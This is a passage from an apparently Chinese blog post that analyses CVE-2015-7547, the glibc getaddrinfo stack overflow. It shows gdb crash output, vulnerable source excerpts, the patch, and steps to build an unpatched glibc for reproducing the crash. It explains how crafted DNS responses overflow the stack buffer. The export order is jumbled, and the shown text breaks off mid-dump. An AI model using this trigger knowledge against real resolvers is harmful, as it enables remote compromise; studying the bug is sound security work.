&lt;repeats 198 times&gt;..., anslen=0x800, answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, </div><div class=\"line\">    nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:582</div><div class=\"line\">#2  0x00007ffff7419fbe in __GI___libc_res_nsearch (statp=0x7ffff7ddc080 &lt;_res@GLIBC_2.2.5&gt;, name=name@entry=0x400717 &quot;foo.bar.google.com&quot;, </div><div class=\"line\">    class=class@entry=0x1, type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 &quot;\\214\\336&quot;, &apos;B&apos; &lt;repeats 198 times&gt;..., </div><div class=\"line\">    anslen=anslen@entry=0x800, answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0)</div><div class=\"line\">    at res_query.c:378</div><div class=\"line\">#3  0x00007ffff762b866 in _nss_dns_gethostbyname4_r (name=0x400717 &quot;foo.bar.google.com&quot;, pat=0x4242424242424242, </div><div class=\"line\">    buffer=0x4242424242424242 &lt;error: Cannot access memory at address 0x4242424242424242&gt;, buflen=0x4242424242424242, errnop=0x7fffffffe8ac, herrnop=0x7fffffffe880, ttlp=0x4242424242424242) at nss_dns/dns-host.c:314</div><div class=\"line\">#4  0x4242424242424242 in ?? ()</div><div class=\"line\">#5  0x4242424242424242 in ?? ()</div><div class=\"line\">#6  0x4242424242424242 in ?? ()</div><div class=\"line\">#7  0x4242424242424242 in ?? ()</div><div class=\"line\">#8  0x4242424242424242 in ?? ()</div><div class=\"line\">#9  0x4242424242424242 in ?? ()</div><div class=\"line\">#10 0x4242424242424242 in ?? ()</div><div class=\"line\">#11 0x4242424242424242 in ?? ()</div><div class=\"line\">#12 0x726c424242424242 in ?? ()</div><div class=\"line\">#13 0x000073726574756f in ?? ()</div><div class=\"line\">#14 0x0000000000000000 in ?? ()</div><div class=\"line\">gdb-peda$</div></pre></td></tr></table></figure>\n<h2 id=\"具体分析\"><a href=\"#具体分析\" class=\"headerlink\" title=\"具体分析\"></a>具体分析</h2><p>从gdb看到的调用栈可以看出，崩溃的调用栈是这样的：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">getaddrinfo() \t/sysdeps/posix/getaddrinfo.c</div><div class=\"line\">|</div><div class=\"line\">gaih_inet()\t\t/sysdeps/posix/getaddrinfo.c</div><div class=\"line\">|</div><div class=\"line\">gethostbyname4_r()\t/resolv/nss_dns/dns-host.c</div><div class=\"line\">|</div><div class=\"line\">__libc_res_nsearch()\t/resolv/res_query.c</div><div class=\"line\">|</div><div class=\"line\">__libc_res_nquerydomain()\t/resolv/res_query.c</div><div class=\"line\">|</div><div class=\"line\">__libc_res_nquery()\t\t/resolv/res_query.c</div><div class=\"line\">|</div><div class=\"line\">__libc_res_nsend()\t\t/resolv/res_send.c</div><div class=\"line\">|</div><div class=\"line\">send_dg()\t/resolv/res_send.c</div><div class=\"line\">(send_vc()\t/resolv/res_send.c)</div></pre></td></tr></table></figure>\n<p>其中，我们给<code>getaddrinfo</code>函数传入的hints参数中，其ai_family为AF_UNSPEC，这个参数使得<code>getaddrinfo</code>在后来会调用<code>gethostbyname4_r()</code>来进行IPV4与IPV6的DNS的并发查询。我们要关注的重点就是<code>gethostbyname4_r()</code>、<code>__libc_res_nsend()</code>、<code>send_dg()</code>。漏洞发生在<code>send_dg</code>函数中。</p>\n<p>函数调用栈中相关的变量关系大概是这样，我觉得搞明白这些变量的意义对于理解这个洞比较关键，但这些变量命名还是挺乱的，我们之后会逐步理清。另外还有一点是关于DNS的基础也是理解的前题，就是DNS一般来说是使用UDP进行请求与响应的，但是如果数据内容大于512bytes（取决于配置），DNS服务器在返回数据包中将会置位truncated flag，然后client将会重新使用TCP来进行本次DNS请求（当然也可以配置只使用TCP）。</p>\n<p><img src=\"/images/cve_2015_7547_0.png\" alt=\"cve_2015_7547_0.png\"></p>\n<p>首先，<code>gethostbynamr4_r()</code>首先在栈上用alloca分配了2048 bytes的空间，同时也定义了ans2p、nans2p、resplen2，这几个变量是用于标识第二个数据包（因为我们需要发送IPV4和IPV6两个DNS请求，因此是有两个数据包，如果使用TCP的DNS请求的响应也分为两次回应的话）的在buffer中的位置、buffer大小以及对应response的大小。相关代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">301</span>   <span class=\"keyword\">union</span></div><div class=\"line\"><span class=\"number\">302</span>   &#123;</div><div class=\"line\"><span class=\"number\">303</span>     querybuf *buf;</div><div class=\"line\"><span class=\"number\">304</span>     u_char *ptr;</div><div class=\"line\"><span class=\"number\">305</span>   &#125; host_buffer;</div><div class=\"line\"><span class=\"number\">306</span>   querybuf *orig_host_buffer;</div><div class=\"line\"><span class=\"number\">307</span>   host_buffer.buf = orig_host_buffer = (querybuf *) alloca (<span class=\"number\">2048</span>); </div><div class=\"line\"><span class=\"number\">308</span>   u_char *ans2p = <span class=\"literal\">NULL</span>;</div><div class=\"line\"><span class=\"number\">309</span>   <span class=\"keyword\">int</span> nans2p = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"number\">310</span>   <span class=\"keyword\">int</span> resplen2 = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"number\">311</span> </div><div class=\"line\"><span class=\"number\">312</span>   <span class=\"keyword\">int</span> olderr = errno;</div><div class=\"line\"><span class=\"number\">313</span>   <span class=\"keyword\">enum</span> nss_status status;</div><div class=\"line\"><span class=\"number\">314</span>   <span class=\"keyword\">int</span> n = __libc_res_nsearch (&amp;_res, name, C_IN, T_UNSPEC,</div><div class=\"line\"><span class=\"number\">315</span>                   host_buffer.buf-&gt;buf, <span class=\"number\">2048</span>, &amp;host_buffer.ptr,</div><div class=\"line\"><span class=\"number\">316</span>                   &amp;ans2p, &amp;nans2p, &amp;resplen2);</div></pre></td></tr></table></figure>\n<p>之后一路调用到<code>__libc_res_nsend</code>，这个函数用于调用（或者是反复调用）<code>send_dg</code>（处理UDP数据包的发送与接收）与<code>send_vc</code>（处理TCP数据包的发送与接收）来完成DNS查询，也就是说<code>send_dg</code>和<code>send_vc</code>只负责单次的DNS请求（但是这个单次不一定就是只有一个数据包，根据需要IPV4还是IPV6还是都需要来决定 ，如果都需要就会在一次调用中完成IPV4与IPV6数据的请求与接收），如果出了什么问题比如timeout或者truncated都会直接返回由<code>__libc_res_nsend</code>来决定是否继续发送及使用什么方式发送。</p>\n<p>现在我们可以来看<code>send_dg</code>函数中产生漏洞的地方，<code>send_dg</code>函数主要是完成了数据包的发送与接收，漏洞出在接收数据包的代码中，我们可以跳过无关的发送代码。首先是定义了一些局部变量：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1191</span>         <span class=\"keyword\">int</span> *thisanssizp;</div><div class=\"line\"><span class=\"number\">1192</span>         u_char **thisansp;</div><div class=\"line\"><span class=\"number\">1193</span>         <span class=\"keyword\">int</span> *thisresplenp;</div></pre></td></tr></table></figure>\n<p>这三个变量用于标识用于接收当前数据包（IPV4的或IPV6）的buffer信息，分别是buffer大小、buffer指针、response长度。我们当前的情况是需要接收两个数据包，IPV4的查询响应与IPV6的查询响应，当接收第一个包的时候，if条件满足（buf2指向之前要发送的第二个数据包buffer，这里用来判断是否只需要接收一个包即可），进入这一段：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1194</span> </div><div class=\"line\"><span class=\"number\">1195</span>         <span class=\"keyword\">if</span> ((recvresp1 | recvresp2) == <span class=\"number\">0</span> || buf2 == <span class=\"literal\">NULL</span>) &#123;</div><div class=\"line\"><span class=\"number\">1196</span>             thisanssizp = anssizp;</div><div class=\"line\"><span class=\"number\">1197</span>             thisansp = anscp ?: ansp;</div><div class=\"line\"><span class=\"number\">1198</span>             assert (anscp != <span class=\"literal\">NULL</span> || ansp2 == <span class=\"literal\">NULL</span>);</div><div class=\"line\"><span class=\"number\">1199</span>             thisresplenp = &amp;resplen;</div><div class=\"line\"><span class=\"number\">1200</span>         &#125; <span class=\"keyword\">else</span> &#123;</div></pre></td></tr></table></figure>\n<p>这一段代码是没有问题的，直接使用了传进来的stack中的2048bytes的buffer去接收数据。但是如果这个2048 bytes的buffer不够，会进入下一段代码使用malloc分配64k的空间进行接收：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1228</span>         <span class=\"keyword\">if</span> (*thisanssizp &lt; MAXPACKET</div><div class=\"line\"><span class=\"number\">1229</span>             <span class=\"comment\">/* Yes, we test ANSCP here.  If we have two buffers</span></div><div class=\"line\">1230                both will be allocatable.  */</div><div class=\"line\"><span class=\"number\">1231</span>             &amp;&amp; anscp</div><div class=\"line\"><span class=\"number\">1232</span> #ifdef FIONREAD</div><div class=\"line\"><span class=\"number\">1233</span>             &amp;&amp; (ioctl (pfd[<span class=\"number\">0</span>].fd, FIONREAD, thisresplenp) &lt; <span class=\"number\">0</span></div><div class=\"line\"><span class=\"number\">1234</span>             || *thisanssizp &lt; *thisresplenp)</div><div class=\"line\"><span class=\"number\">1235</span> #endif</div><div class=\"line\"><span class=\"number\">1236</span>                     ) &#123;</div><div class=\"line\"><span class=\"number\">1237</span>             u_char *newp = <span class=\"built_in\">malloc</span> (MAXPACKET);</div><div class=\"line\"><span class=\"number\">1238</span>             <span class=\"keyword\">if</span> (newp != <span class=\"literal\">NULL</span>) &#123;</div><div class=\"line\"><span class=\"number\">1239</span>                 *anssizp = MAXPACKET;</div><div class=\"line\"><span class=\"number\">1240</span>                 *thisansp = ans = newp;</div><div class=\"line\"><span class=\"number\">1241</span>             &#125;</div><div class=\"line\"><span class=\"number\">1242</span>         &#125;</div></pre></td></tr></table></figure>\n<p>其实单单看这一段代码是没有问题的，从对这个漏洞的patch也可以看出，只不过是换了一个host_buffer的指针去修改host_bufer指向newp，本质上在这里其实并没有什么改变：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">-\t\t\t\t*anssizp = MAXPACKET;</div><div class=\"line\">-\t\t\t\t*thisansp = ans = newp;</div><div class=\"line\">+\t\t\t\t*thisanssizp = MAXPACKET;</div><div class=\"line\">+\t\t\t\t*thisansp = newp;</div></pre></td></tr></table></figure>\n<p>其实问题是这样产生的，从上面给出的变量图可以看到，这里是想要host_buffer指向新的buffer以及修改anssiz来反映这个buffer的大小变化，然后让<code>__libc_res_nsend</code>中的ans依然指向2048bytes因为如果第二个数据包比较小还依然能存在栈中，这个意图没有问题，实际上问题出在下面的关于准备第二个数据包的buffer相关变量中：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1200</span>         &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\"><span class=\"number\">1201</span>             <span class=\"keyword\">if</span> (*anssizp != MAXPACKET) &#123;</div><div class=\"line\"><span class=\"number\">1202</span>                 <span class=\"comment\">/* No buffer allocated for the first</span></div><div class=\"line\">1203                    reply.  We can try to use the rest</div><div class=\"line\">1204                    of the user-provided buffer.  */</div><div class=\"line\"><span class=\"number\">1205</span> #ifdef _STRING_ARCH_unaligned</div><div class=\"line\"><span class=\"number\">1206</span>                 *anssizp2 = orig_anssizp - resplen;</div><div class=\"line\"><span class=\"number\">1207</span>                 *ansp2 = *ansp + resplen;</div><div class=\"line\"><span class=\"number\">1208</span> <span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></div><div class=\"line\">...\t\t\t\t\t[...]</div><div class=\"line\"><span class=\"number\">1214</span> <span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"><span class=\"number\">1215</span>             &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\"><span class=\"number\">1216</span>                 <span class=\"comment\">/* The first reply did not fit into the</span></div><div class=\"line\">1217                    user-provided buffer.  Maybe the second</div><div class=\"line\">1218                    answer will.  */</div><div class=\"line\"><span class=\"number\">1219</span>                 *anssizp2 = orig_anssizp;</div><div class=\"line\"><span class=\"number\">1220</span>                 *ansp2 = *ansp;</div><div class=\"line\"><span class=\"number\">1221</span>             &#125;</div><div class=\"line\"><span class=\"number\">1222</span> </div><div class=\"line\"><span class=\"number\">1223</span>             thisanssizp = anssizp2;</div><div class=\"line\"><span class=\"number\">1224</span>             thisansp = ansp2;</div><div class=\"line\"><span class=\"number\">1225</span>             thisresplenp = resplen2;</div><div class=\"line\"><span class=\"number\">1226</span>         &#125;</div></pre></td></tr></table></figure>\n<p>问题是出在关于orig_anssizp变量的处理上，这个变量是在<code>send_dg</code>一开始这样赋值的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1000</span>     <span class=\"keyword\">int</span> orig_anssizp = *anssizp;</div></pre></td></tr></table></figure>\n<p>结合第二个数据包的buffer准备就可以看到问题了，本来用来标识64k的heap中的buffer大小的变量却被用来标志2048bytes的栈buffer的大小，然后传递给<code>recvfrom</code>来接受数据：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1246</span>         *thisresplenp = recvfrom(pfd[<span class=\"number\">0</span>].fd, (<span class=\"keyword\">char</span>*)*thisansp,</div><div class=\"line\"><span class=\"number\">1247</span>                      *thisanssizp, <span class=\"number\">0</span>,</div><div class=\"line\"><span class=\"number\">1248</span>                     (<span class=\"keyword\">struct</span> sockaddr *)&amp;from, &amp;fromlen);</div></pre></td></tr></table></figure>\n<p>这个时候一旦接个大的数据包就有问题了，stack-overflow就产生了。从patch中也可以证明：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">-\t<span class=\"keyword\">int</span> orig_anssizp = *anssizp;</div></pre></td></tr></table></figure>\n<p>以及</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div></pre></td><td class=\"code\"><pre><div class=\"line\">@@ <span class=\"number\">-1154</span>,<span class=\"number\">50</span> +<span class=\"number\">1123</span>,<span class=\"number\">48</span> @@ send_dg(res_state statp,</div><div class=\"line\"> \t\t\tassert (anscp != <span class=\"literal\">NULL</span> || ansp2 == <span class=\"literal\">NULL</span>);</div><div class=\"line\"> \t\t\tthisresplenp = &amp;resplen;</div><div class=\"line\"> \t\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">-\t\t\t<span class=\"keyword\">if</span> (*anssizp != MAXPACKET) &#123;</div><div class=\"line\">-\t\t\t\t<span class=\"comment\">/* No buffer allocated for the first</span></div><div class=\"line\">-\t\t\t\t   reply.  We can try to use the rest</div><div class=\"line\">-\t\t\t\t   of the user-provided buffer.  */</div><div class=\"line\">-#<span class=\"keyword\">if</span> _STRING_ARCH_unaligned</div><div class=\"line\">-\t\t\t\t*anssizp2 = orig_anssizp - resplen;</div><div class=\"line\">-\t\t\t\t*ansp2 = *ansp + resplen;</div><div class=\"line\">-#<span class=\"keyword\">else</span></div><div class=\"line\">-\t\t\t\t<span class=\"keyword\">int</span> aligned_resplen</div><div class=\"line\">-\t\t\t\t  = ((resplen + __alignof__ (HEADER) - <span class=\"number\">1</span>)</div><div class=\"line\">-\t\t\t\t     &amp; ~(__alignof__ (HEADER) - <span class=\"number\">1</span>));</div><div class=\"line\">-\t\t\t\t*anssizp2 = orig_anssizp - aligned_resplen;</div><div class=\"line\">-\t\t\t\t*ansp2 = *ansp + aligned_resplen;</div><div class=\"line\">-#endif</div><div class=\"line\">-\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">-\t\t\t\t<span class=\"comment\">/* The first reply did not fit into the</span></div><div class=\"line\">-\t\t\t\t   user-provided buffer.  Maybe the second</div><div class=\"line\">-\t\t\t\t   answer will.  */</div><div class=\"line\">-\t\t\t\t*anssizp2 = orig_anssizp;</div><div class=\"line\">-\t\t\t\t*ansp2 = *ansp;</div><div class=\"line\">-\t\t\t&#125;</div><div class=\"line\">-</div><div class=\"line\"> \t\t\tthisanssizp = anssizp2;</div><div class=\"line\"> \t\t\tthisansp = ansp2;</div><div class=\"line\"> \t\t\tthisresplenp = resplen2;</div><div class=\"line\"> \t\t&#125;</div></pre></td></tr></table></figure>\n<p>可以看出patch的主要思路就是直接删除了在接受第二个数据包的时候对于栈上的buffer的考虑。</p>\n<p><code>send_vc</code>中接受数据包的buffer处理基本和<code>send_dg</code>相同。所以我们也就可以理清POC中的利用思路，首先先是UDP请求IPV4和IPV6的DNS响应，然后服务器返回一个较大的响应包并设置truncated flag，这个时候send_dg中接受到这个包看到TC标志就立刻设置相关变量并返回使得<code>__libc_res_nsend</code>使用<code>send_vc</code>继续（所以我觉得POC中的等到接受到再一次的TCP请求再将之前的UDP包返回来我是没搞明白其意义，这个时候client应该不会再理会这第二个UDP响应了，我尝试修改poc试了一下也确实没有问题，难道poc中这么做只是为了避免client可能的等待？），然后由于orig_anssizp的关系，第一个数据包使用栈中的buffer接受了，但是第二个大数据包到来的时候因为orig_anssizp太大而计算size错误导致了溢出。</p>\n<h2 id=\"还有一些\"><a href=\"#还有一些\" class=\"headerlink\" title=\"还有一些\"></a>还有一些</h2><p>这个漏洞并不止google给出的POC中的一种触发姿势，只要能够先让malloc发生，然后立刻返回再send一次让orig_anssizp被改为64k就可以。比如也可以使用timeout的方式来完成。</p>\n<p>但是POC离对这个CVE的RCE还有些距离，虽然没有canary，但除了要过ASLR和NX保护以外，还要过一些check，在<code>gethostbyname4_r</code>返回前，host_buffer和ans2p这两个变量会被检查是否为null然后交给<code>free()</code>，所以这里是个问题，但也不是不可能的，在特定场景下或者搭配其他漏洞应该是可以过去的，这里还需要进一步折腾。</p>\n","excerpt":"<p>CVE-2015-7547，由google安全团队披露的glibc中getaddrinfo()函数产生的stack overflow漏洞，影响glibc版本2.9-2.22，产生漏洞的原因在于getaddrinfo在进行DNS查询的过程中，调用到send_dg()或者send_vc()的时候，由于逻辑错误导致标识buffer大小的变量和buffer的实际大小出现了不统一，进一步导致stack-overflow的发生。</p>","more":"<p><a href=\"https://github.com/fjserna/CVE-2015-7547\">这里</a>有google团队给出的POC，但是保留了EXP——“We will not release our exploit code, but a non-weaponized Proof of Concept has been made available simultaneously with this blog post”。经过分析来看RCE是可行的，但是还需要去绕过一些保护机制和check。</p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>这个用户态的漏洞还是比较好复现的。首先我们需要获取一份未patch的存在漏洞的glibc，可以从<a href=\"http://mirror.hust.edu.cn/gnu/libc/\">GNU站点</a>中下载，然后编译安装：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">tar zxvf glibc-2.19.tar.gz </div><div class=\"line\"><span class=\"built_in\">cd</span> /glibc-2.19</div><div class=\"line\">mkdir build &amp;&amp; <span class=\"built_in\">cd</span> build</div><div class=\"line\">../configure --prefix=/usr/<span class=\"built_in\">local</span>/glibc219/ --enable-debug CFLAGS=<span class=\"string\">\"-g -O1\"</span> CPPFLAGS=<span class=\"string\">\"-g -O1\"</span></div><div class=\"line\">make</div><div class=\"line\">make install</div></pre></td></tr></table></figure>\n<p>在google给出的poc中，一份python用来监控53端口模拟DNS服务器以产生构造的DNS响应包，另一份client简单调用getaddrinfo函数触发漏洞。</p>\n<p>我们需要将google给出的poc中的client使用存在漏洞的glibc进行编译，需要参数rpath和dynamic-linker来指定glibc与对应的ld-linux：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">-Wl,-rpath=/path/to/new/glibc/lib</div><div class=\"line\">-Wl,-dynamic-linker=/path/to/newglibc/ld-linux.so.2</div></pre></td></tr></table></figure>\n<p>然后修改本地dns服务器为127.0.0.1，对应的配置文件为/etc/resolv.conf。之后分别启动python文件和client，就可以看到崩溃：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@Tencent1:~/CVE-2015-7547$ ./client</div><div class=\"line\">Segmentation fault</div></pre></td></tr></table></figure>\n<p>可以用gdb确认一下崩溃位置：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@Tencent1:~/CVE-2015-7547$ gdb client </div><div class=\"line\">GNU gdb (Debian 7.11.1-2) 7.11.1</div><div class=\"line\">Copyright (C) 2016 Free Software Foundation, Inc.</div><div class=\"line\">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class=\"line\">This is free software: you are free to change and redistribute it.</div><div class=\"line\">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class=\"line\">and &quot;show warranty&quot; for details.</div><div class=\"line\">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</div><div class=\"line\">Type &quot;show configuration&quot; for configuration details.</div><div class=\"line\">For bug reporting instructions, please see:</div><div class=\"line\">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class=\"line\">Find the GDB manual and other documentation resources online at:</div><div class=\"line\">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class=\"line\">For help, type &quot;help&quot;.</div><div class=\"line\">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class=\"line\">Reading symbols from client...(no debugging symbols found)...done.</div><div class=\"line\">gdb-peda$ r</div><div class=\"line\">Starting program: /root/CVE-2015-7547/client </div><div class=\"line\"></div><div class=\"line\">Program received signal SIGSEGV, Segmentation fault.</div><div class=\"line\"> [----------------------------------registers-----------------------------------]</div><div class=\"line\">RAX: 0x7fffffffe2a8 (&apos;B&apos; &lt;repeats 150 times&gt;, &quot;lrouters&quot;)</div><div class=\"line\">RBX: 0x4242424242424242 (&apos;BBBBBBBB&apos;)</div><div class=\"line\">RCX: 0xffffffffffffffff </div><div class=\"line\">RDX: 0x4242424242424242 (&apos;BBBBBBBB&apos;)</div><div class=\"line\">RSI: 0x0 </div><div class=\"line\">RDI: 0xffffffff </div><div class=\"line\">RBP: 0x7fffffffd0b0 --&gt; 0x7ffff7ddc080 --&gt; 0x200000001 </div><div class=\"line\">RSP: 0x7fffffffcde0 --&gt; 0x1000001045e </div><div class=\"line\">RIP: 0x7ffff741986c (&lt;__GI___libc_res_nquery+1084&gt;:     movzx  eax,BYTE PTR [rbx+0x3])</div><div class=\"line\">R8 : 0x24 (&apos;$&apos;)</div><div class=\"line\">R9 : 0x7fffffffcc68 --&gt; 0x7fffffffda40 --&gt; 0x424242424242de8c </div><div class=\"line\">R10: 0x7fffffffc610 --&gt; 0x0 </div><div class=\"line\">R11: 0x206 </div><div class=\"line\">R12: 0xbcc </div><div class=\"line\">R13: 0x7fffffffe2b0 (&apos;B&apos; &lt;repeats 142 times&gt;, &quot;lrouters&quot;)</div><div class=\"line\">R14: 0x24 (&apos;$&apos;)</div><div class=\"line\">R15: 0x7ffff7ddc080 --&gt; 0x200000001</div><div class=\"line\">EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)</div><div class=\"line\">[-------------------------------------code-------------------------------------]</div><div class=\"line\">   0x7ffff7419859 &lt;__GI___libc_res_nquery+1065&gt;:        lea    rsi,[rip+0x8b29]        # 0x7ffff7422389</div><div class=\"line\">   0x7ffff7419860 &lt;__GI___libc_res_nquery+1072&gt;:        lea    rdi,[rip+0x8b81]        # 0x7ffff74223e8</div><div class=\"line\">   0x7ffff7419867 &lt;__GI___libc_res_nquery+1079&gt;:        call   0x7ffff7415820 &lt;__assert_fail@plt&gt;</div><div class=\"line\">=&gt; 0x7ffff741986c &lt;__GI___libc_res_nquery+1084&gt;:        movzx  eax,BYTE PTR [rbx+0x3]</div><div class=\"line\">   0x7ffff7419870 &lt;__GI___libc_res_nquery+1088&gt;:        and    eax,0xf</div><div class=\"line\">   0x7ffff7419873 &lt;__GI___libc_res_nquery+1091&gt;:        jne    0x7ffff7419a5f &lt;__GI___libc_res_nquery+1583&gt;</div><div class=\"line\">   